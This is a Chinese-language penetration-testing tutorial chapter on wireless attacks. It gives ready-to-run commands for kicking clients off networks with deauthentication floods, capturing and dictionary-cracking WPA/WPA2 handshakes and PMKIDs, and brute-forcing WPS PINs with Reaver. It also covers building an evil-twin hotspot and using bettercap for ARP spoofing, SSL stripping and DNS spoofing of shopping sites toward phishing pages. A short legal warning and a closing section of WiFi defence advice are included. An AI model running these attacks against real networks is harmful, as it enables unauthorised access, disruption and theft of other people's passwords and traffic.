## 7.1 WiFi基础

### 7.1.1 WiFi加密方式的演变

WiFi的加密方式一直在升级，
但每个都有被破解的方法。

```
WiFi加密发展历程：

1. 开放（Open）→ 完全不加密，谁都能连
   （现在一般只有公共WiFi是这样）

2. WEP → 第一代加密，超级弱，几分钟就破
   （已经被淘汰了，现在基本看不到了）

3. WPA → 第二代，比WEP强，但也有漏洞
   （WPA-TKIP 已经被破解了）

4. WPA2 → 现在最常用的，比较安全
   （WPA2-AES 目前还算安全，但跑字典能破弱密码）
   （还有KRACK漏洞，但比较难利用）

5. WPA3 → 最新的，安全性更高
   （但设备还不多，慢慢普及中）
```

### 7.1.2 2.4G和5G的区别

```
2.4G WiFi：
  ✓ 穿墙好，覆盖范围大
  ✓ 设备多，兼容性好
  ✗ 干扰大（蓝牙、微波炉、邻居的WiFi...）
  ✗ 速度慢，最快也就几十MB/s
  频道：1-13（中国）

5G WiFi：
  ✓ 速度快，几百MB/s
  ✓ 干扰小，用的人少
  ✗ 穿墙差，一堵墙就没了
  ✗ 覆盖范围小
  频道：36-165
```

破解的时候一般先搞2.4G的，
因为设备多、信号好、容易抓包。

### 7.1.3 需要什么硬件

做无线渗透，你的无线网卡得支持"监听模式"和"注入"。

```
推荐的无线网卡：

1. 瑞昱 RTL8188CUS / RTL8188EUS
   → 便宜，十几块钱
   → 支持监听和注入
   → 只支持2.4G
   → 新手推荐

2. Atheros AR9271
   → 经典中的经典
   → 支持监听、注入
   → 只支持2.4G
   → 稳定性好

3. 瑞昱 RTL8812AU / RTL8814AU
   → 支持2.4G+5G双频
   → 速度快
   → 需要装驱动
   → 稍微贵点

4. 英特尔 AX200 / AX210
   →  WiFi 6网卡
   → 5G支持好
   → Kali里驱动可能有点麻烦
```

> 💡 **注意**：笔记本内置的网卡一般也支持监听，
> 但有些不支持注入。
> 新手建议买个USB无线网卡，十几块钱的就行。

## 7.2 Aircrack-ng套件——无线渗透神器

Aircrack-ng是最经典的无线渗透工具套件，
包含一堆工具，每个干一件事。

### 7.2.1 Aircrack-ng都有啥

```
aircrack-ng套件包含：

airmon-ng    → 开启/关闭监听模式
airodump-ng  → 抓包、扫描WiFi
aireplay-ng  → 发包、注入、踢人下线
aircrack-ng  → 跑密码（破解WPA/WPA2）
airbase-ng   → 建假AP（邪恶热点）
aireplay-ng  → 各种注入攻击
airdecap-ng  → 解密抓的包
...还有好几个
```

### 7.2.2 第一步：把网卡切到监听模式

正常模式下网卡只能收发给自己的数据包，
监听模式下能收到空中所有的WiFi数据包。

```bash
# 第一步：先看看你的无线网卡叫啥
kali@kali:~$ ip link show
# 或者
kali@kali:~$ iwconfig
# 一般叫 wlan0, wlan1 之类的

# 第二步：关掉可能影响的进程
kali@kali:~$ sudo airmon-ng check kill
# 这会把NetworkManager啥的都杀掉
# （不然会干扰监听模式）

# 第三步：开启监听模式
kali@kali:~$ sudo airmon-ng start wlan0
# 把wlan0换成你的网卡名

# 第四步：看看成功了没
kali@kali:~$ iwconfig
# 应该会多了个 wlan0mon 接口
# 模式是 Monitor 就是成功了
```

> 📝 **小知识**：
> 开启监听模式后，网卡名字一般会加个mon后缀，
> 比如 wlan0 → wlan0mon

### 7.2.3 第二步：扫描附近的WiFi

开启监听模式后，
我们来看看附近有哪些WiFi。

```bash
# 扫描所有WiFi
kali@kali:~$ sudo airodump-ng wlan0mon

# 你会看到一堆信息，大概长这样：
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 11:22:33:44:55:66  -45      100       50    2   6   54e  WPA2 CCMP   PSK  MyWiFi
 AA:BB:CC:DD:EE:FF  -60       50        0    0   1   54e  WPA2 CCMP   PSK  NeighborWiFi
 ...
```

我们来解释一下每列是啥：

| 列名 | 说明 |
|------|------|
| BSSID | 路由器的MAC地址 |
| PWR | 信号强度，数字越大（越接近0）信号越好 |
| CH | 频道（信道） |
| ENC | 加密方式（WPA2/WEP/OPN） |
| CIPHER | 加密算法（CCMP就是AES，TKIP就是TKIP） |
| AUTH | 认证方式（PSK就是个人版，MGT就是企业版） |
| ESSID | WiFi名字 |

下面还有客户端列表：
```
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 11:22:33:44:55:66  AA:BB:CC:DD:EE:FF  -50    0 - 1    0        10        MyWiFi
```
- STATION：连接的客户端（手机/电脑）的MAC地址

> 💡 **按 Ctrl+C 停止扫描**

### 7.2.4 怎么选目标

扫描完了，选哪个来练手呢？

```
好目标的标准：
  ✓ 信号强（PWR在-50到-70之间最好）
  ✓ 有客户端连接（这样才能抓握手包）
  ✓ 是WPA/WPA2 PSK（个人版）
  ✓ 你自己的WiFi！（违法的事不能干）

不好的目标：
  ✗ 信号太弱（-80以下）
  ✗ 没有客户端（抓不到握手包）
  ✗ WPA3（目前还不好破）
  ✗ WPA企业版（MGT），那个要另一种方法
```

## 7.3 WPA/WPA2破解实战

### 7.3.1 破解原理

WPA/WPA2的密码不是直接抓的，
要抓一个叫"四次握手"的东西，
然后用字典去跑。

```
WPA破解原理：

1. 客户端连WiFi的时候，
   会和路由器进行四次握手（4-Way Handshake）

2. 这个握手里包含了验证密码用的信息，
   我们在旁边监听，就能把这个握手包抓下来

3. 抓到手之后，
   我们用字典里的密码一个个算，
   算出来的结果和握手包里的比对，
   对上了就是密码！

简单说：
  抓握手包 → 字典跑 → 出密码
```

### 7.3.2 完整步骤

#### 第一步：开启监听模式

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

#### 第二步：扫描WiFi，锁定目标

```bash
sudo airodump-ng wlan0mon
```

记下目标的：
- BSSID（路由器MAC）
- CH（频道）
- ESSID（WiFi名）

假设目标是：
- BSSID: 11:22:33:44:55:66
- CH: 6
- ESSID: MyWiFi

#### 第三步：开始抓包

开一个终端窗口，运行airodump-ng专门抓这个WiFi的包：

```bash
sudo airodump-ng -c 6 --bssid 11:22:33:44:55:66 -w capture wlan0mon

# 参数说明：
# -c 6 → 指定频道6（要和目标一致！）
# --bssid ... → 指定目标BSSID
# -w capture → 抓到的包存到capture开头的文件里
```

这时候窗口右上角如果显示 `WPA handshake: xx:xx:xx:xx:xx:xx`，
就说明抓到握手包了！

#### 第四步：强制客户端重连（抓握手包）

如果等了半天还没抓到握手包，
那我们就主动出击——
把客户端踢下线，它自动重连的时候，
我们就能抓到握手包了。

这个攻击叫 **Deauth攻击**（解除认证攻击）。

**再开一个终端窗口**（第一个抓包的别关！）：

```bash
sudo aireplay-ng -0 0 -a 11:22:33:44:55:66 -c AA:BB:CC:DD:EE:FF wlan0mon

# 参数说明：
# -0 0 → Deauth攻击模式，0表示无限发
#        想发10个包就写 -0 10
# -a 路由器BSSID
# -c 客户端MAC（就是你要踢的那个人）
#    不写-c的话就是踢所有客户端
```

运行之后，
那个客户端就会掉线，
然后一般会自动重连，
重连的时候，
第一个窗口的airodump-ng就能抓到握手包了。

抓到握手包之后，两个窗口都可以Ctrl+C停了。

#### 第五步：跑字典破解密码

```bash
# 看看抓到的文件
ls -la capture*
# 应该有 capture-01.cap 之类的文件

# 开始破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# -w 指定字典
# capture-01.cap 是抓的包文件
```

如果密码在字典里，
一会儿就跑出来了：

```
                          Aircrack-ng 1.7

              [00:00:00] 123456/14344392 keys tested (12345.12 k/s)

              KEY FOUND! [ 12345678 ]

      Master Key     : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99
      Transient Key  : ...
      EAPOL HMAC     : ...
```

🎉 **密码出来了！就是 12345678**

> 💡 **如果没跑出来怎么办？**
> 那就是字典里没有这个密码。
> 换更好的字典，或者用掩码攻击试试。

### 7.3.3 用Hashcat跑WPA（更快）

aircrack-ng是CPU跑的，
如果你的显卡好，
用Hashcat跑会快很多。

```bash
# 第一步：把cap转换成hccapx格式
# 方法1：用cap2hccapx工具
# 方法2：在线转换 https://hashcat.net/cap2hccapx/
# 方法3：用hcxtools的hcxpcapngtool

hcxpcapngtool -o test.hc22000 capture-01.cap

# 第二步：用Hashcat跑
hashcat -m 22000 -a 0 test.hc22000 rockyou.txt

# -m 22000 是 WPA-PBKDF2-PMKID+EAPOL 的意思
# 比旧的2500模式更准确
```

### 7.3.4 影响破解速度的因素

```
破解速度取决于：
  1. 密码强度
     → 8位纯数字，几秒到几分钟
     → 8位小写字母，几小时到几天
     → 10位混合，基本跑不出来

  2. 字典大小和质量
     → 字典越好，命中率越高
     → 不是越大越好，要精准

  3. 硬件性能
     → CPU：一般般，每秒几千到几万
     → GPU：快很多，每秒几十万到几百万
     → 越好的显卡越快
```

## 7.4 WPS漏洞——不用密码也能连

WPS（WiFi Protected Setup）是个方便用户的功能，
按一下路由器上的按钮，或者输个8位PIN码，
就能连上WiFi，不用输长密码。

但这个功能有漏洞！

### 7.4.1 WPS漏洞原理

```
WPS的PIN码是8位数字：
  • 前4位一组
  • 后4位一组（最后一位是校验位，实际只有3位有效）
  • 两组分开验证

问题来了：
  前4位对不对，路由器会告诉你
  后4位对不对，路由器也会告诉你
  而且是分开告诉你的！

这样我们就可以分开猜：
  前4位：10000种可能（0000-9999）
  后3位：1000种可能（000-999）
  加起来才 11000 种！
  而不是 100000000 种！

运气好的话，几个小时就能跑出来PIN码，
拿到PIN码就能算出WiFi密码！
```

这就是著名的 **WPS Pixie Dust攻击**。

### 7.4.2 哪些路由器有这漏洞

```
有漏洞的芯片：
  • Realtek（瑞昱）
  • MediaTek / Ralink（联发科）
  • Broadcom（博通，某些版本）

没漏洞的：
  • Qualcomm Atheros（高通创锐讯）
  • 比较新的路由器
```

### 7.4.3 实战：WPS破解

用 **Reaver** 或者 **Bully** 工具。

```bash
# 第一步：扫描哪些WiFi开了WPS
sudo wash -i wlan0mon

# 你会看到类似这样的：
BSSID               Ch  dBm  WPS  Lck  Vendor  ESSID
11:22:33:44:55:66    6  -45  1.0  No   Realtek MyWiFi
                            ↑
                       WPS版本1.0，可能有漏洞
```

```bash
# 第二步：跑Reaver
sudo reaver -i wlan0mon -b 11:22:33:44:55:66 -vv

# -i 网卡
# -b 目标BSSID
# -vv 显示详细信息

# 如果有Pixie Dust漏洞，会快很多
# 加上 -K 参数强制用Pixie Dust攻击
sudo reaver -i wlan0mon -b 11:22:33:44:55:66 -K -vv
```

跑出来之后会显示PIN码和WPA密码。

> 💡 **注意**：
> 现在很多路由器有防暴力破解的机制，
> 失败几次就会锁定WPS，
> 这时候就只能等了。
> 所以这个攻击要看运气。

## 7.5 邪恶热点（Evil Twin）——更阴险的攻击

### 7.5.1 啥是邪恶热点

```
邪恶热点 = 假的WiFi热点

原理很简单：
  攻击者建一个和你家WiFi名字一模一样的热点，
  信号比你家的还强，
  你的手机/电脑就会自动连上去。

连上去之后：
  • 所有流量都经过攻击者
  • 可以窃取密码、账号
  • 可以篡改网页
  • 可以弹广告、挂马
  • ......
```

### 7.5.2 实战：搭建邪恶热点

用airbase-ng或者create_ap都能搭。

#### 方法1：用create_ap（简单）

```bash
# 安装create_ap
sudo apt install create_ap

# 建一个热点
sudo create_ap wlan0 eth0 MyFreeWiFi 12345678

# 参数：
# wlan0 → 用来发射WiFi的网卡
# eth0 → 用来上网的网卡（提供网络）
# MyFreeWiFi → WiFi名字
# 12345678 → 密码（不写密码就是开放网络）
```

#### 方法2：用airbase-ng + iptables（手动）

```bash
# 第一步：建AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
# -e WiFi名字
# -c 频道
# 运行后会出来一个 at0 接口

# 第二步：配置IP和转发
# 开另一个终端
sudo ifconfig at0 192.168.10.1 netmask 255.255.255.0

# 第三步：开启IP转发
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# 第四步：配置NAT（让客户端能上网）
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# 第五步：开DHCP（给客户端分配IP）
# 装个isc-dhcp-server或者dnsmasq
# 配置好DHCP地址池
```

然后别人搜到这个"FreeWiFi"，
连上来之后，
所有流量都经过你的电脑了。

### 7.5.3 中间人攻击（MITM）

受害者连上邪恶热点之后，
我们就能搞很多事情了。

#### 1. 抓明文密码

用Wireshark抓包，
或者用 driftnet 看对方浏览的图片。

```bash
driftnet -i at0
# 就能看到对方浏览器里的图片了
```

#### 2. SSL Stripping（SSL剥离）

现在网站大多是HTTPS的，
但可以用SSL Stripping攻击，
把HTTPS降级成HTTP，
就能看到明文了。

用 **sslstrip** 或者 **bettercap**。

```bash
# bettercap比较新，功能强
sudo bettercap -iface at0

# 进入bettercap后：
> net.probe on
> net.show
> arp.spoof on
> http.proxy on
> https.proxy on
```

#### 3. DNS欺骗

把域名解析到错误的IP，
比如把淘宝解析到钓鱼网站。

```bash
# bettercap里：
> set dns.spoof.domains taobao.com,jd.com
> dns.spoof on
```

> ⚠️ **重要提醒**：
> 这些攻击都只能用在你自己的设备上做实验，
> 对别人用是违法的！
> 学习是为了防护，不是为了攻击。

## 7.6 其他无线攻击

### 7.6.1 Deauth攻击（踢人下线）

前面抓握手包的时候用过，
这个攻击单独拿出来说一下，
因为它很常见。

```
Deauth攻击原理：
  给客户端发"解除认证"帧，
  冒充路由器告诉客户端：你被踢了，重新连吧。
  客户端就会掉线重连。

能干啥：
  • 抓握手包（前面说过了）
  • 干扰别人上网（恶意的）
  • 邪恶热点配合（把人从真WiFi踢下来，
    让他自动连到假WiFi上）

防御：
  不好防，这是WiFi协议的问题
  用5G会好一点（2.4G更容易被干扰）
  有些企业级AP有防护
```

### 7.6.2 PMKID攻击

这个是比较新的攻击方法，
**不需要客户端在线**也能拿到密码的材料！

```
普通WPA破解要等客户端连，
要抓四次握手。

PMKID攻击不用，
只要路由器支持，
发一个请求过去，
路由器就会返回PMKID，
拿这个PMKID就能跑字典了。
```

用hcxdumptool抓：

```bash
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1

# 然后用hcxpcapngtool转换
hcxpcapngtool -o test.hc22000 dump.pcapng

# 然后Hashcat跑
hashcat -m 22000 test.hc22000 rockyou.txt
```

> 💡 **这个攻击的好处**：
> 不需要有客户端连接，
> 只要路由器开着，就能抓。
> 但不是所有路由器都有这个问题，
> 新一点的路由器可能已经修复了。

### 7.6.3 KRACK攻击

KRACK（密钥重装攻击）是WPA2协议层面的漏洞，
CVE-2017-13082。

```
原理：
  利用WPA2四次握手中的漏洞，
  强制重装密钥，
  可以解密流量、甚至注入数据。

影响：
  理论上所有WPA2设备都受影响
  但实际利用有难度
  现在大部分设备都打补丁了
```

这个漏洞比较复杂，
新手了解一下就行。

## 7.7 WiFi安全防御

讲了这么多攻击，
那怎么保护自己的WiFi呢？

```
WiFi安全建议：

1. 密码要够强
   • 至少12位
   • 大小写+数字+特殊符号
   • 不要用生日、手机号、门牌号
   • 每个WiFi密码不一样

2. 加密方式选WPA2-AES（或WPA3）
   • 不要用WEP（太弱了）
   • 不要用WPA-TKIP（也弱）
   • 有WPA3就用WPA3

3. 关掉WPS
   • WPS漏洞太多了
   • 路由器管理页面里找WPS设置，关掉！

4. 隐藏SSID？（效果有限）
   • 不广播WiFi名字
   • 但稍微懂点的人还是能扫到
   • 聊胜于无吧

5. MAC地址过滤？（也不太靠谱）
   • 只允许指定的MAC地址连
   • 但MAC地址可以改（伪造）
   • 防小白可以，防不住老手

6. 访客网络
   • 给客人用单独的访客WiFi
   • 和主网络隔离
   • 访客网络就算被攻破了也没事

7. 路由器安全
   • 改管理员密码（默认的admin/admin太弱了）
   • 关掉远程管理
   • 关掉UPnP
   • 定期更新固件
   • 不用的时候把路由器关了

8. 公共WiFi注意事项
   • 尽量不要连陌生的免费WiFi
   • 连公共WiFi的时候别搞敏感操作
     （别网银、别输密码）
   • 重要操作用自己的流量
   • 用VPN加密流量
```
